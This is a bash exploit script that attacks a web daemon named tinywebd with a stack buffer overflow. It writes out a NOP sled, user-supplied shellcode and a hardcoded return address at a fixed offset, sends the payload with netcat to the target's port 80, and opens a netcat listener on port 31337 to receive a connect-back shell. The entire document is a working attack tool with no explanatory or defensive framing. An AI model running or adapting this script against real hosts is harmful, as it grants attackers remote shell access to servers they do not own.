#!/bin/bash
# a tool for exploiting tinywebd with connectback shellcode

if [ -z "$2" ]; then  # if argument 2 is blank
   echo "Usage: $0 <shellcode file> <target IP> [connectback?]"
   exit
fi
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # at +100 bytes from buffer @ 0xbffff7dc
echo "target IP: $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "shellcode: $1 ($SIZE bytes)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE))
echo "aligned sled size: $ALIGNED_SLED_SIZE"

perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE" > ./.xploit_buffer
cat $1 >> ./.xploit_buffer
perl -e "print \"$RETADDR\"x32 . \"\r\n\"" >> ./.xploit_buffer

bash -c "sleep 1; cat ./.xploit_buffer | nc -w 1 -v $2 80" & # send the exploit in 1 second
nc -vv -l -p 31337 # listen for connect back 
rm ./.xploit_buffer
